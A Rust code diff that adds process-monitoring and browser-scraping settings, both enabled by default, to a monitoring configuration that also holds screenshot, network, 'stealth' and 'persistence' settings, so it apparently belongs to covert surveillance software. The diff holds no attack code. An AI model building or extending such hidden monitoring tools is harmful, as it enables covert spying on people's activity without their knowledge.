@@ -131,6 +131,40 @@ pub struct MonitoringConfig {
     pub network: NetworkMonitoringConfig,
     #[serde(default)]
     pub screenshots: ScreenshotMonitoringConfig,
+    #[serde(default)]
+    pub processes: ProcessMonitoringConfig,
+    #[serde(default)]
+    pub browser: BrowserMonitoringConfig,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ProcessMonitoringConfig {
+    pub enabled: bool,
+    pub interval_seconds: u64,
+}
+
+impl Default for ProcessMonitoringConfig {
+    fn default() -> Self {
+        ProcessMonitoringConfig {
+            enabled: true,
+            interval_seconds: 10,
+        }
+    }
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct BrowserMonitoringConfig {
+    pub enabled: bool,
+    pub scrape_interval_minutes: u64,
+}
+
+impl Default for BrowserMonitoringConfig {
+    fn default() -> Self {
+        BrowserMonitoringConfig {
+            enabled: true,
+            scrape_interval_minutes: 15,
+        }
+    }
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -240,6 +274,8 @@ impl Config {
                     compression_quality: 85, // Good quality, reasonable size
                     format: "jpeg".to_string(),
                 },
+                processes: ProcessMonitoringConfig::default(),
+                browser: BrowserMonitoringConfig::default(),
             },
             stealth: StealthConfig::default(),
             persistence: PersistenceConfig {
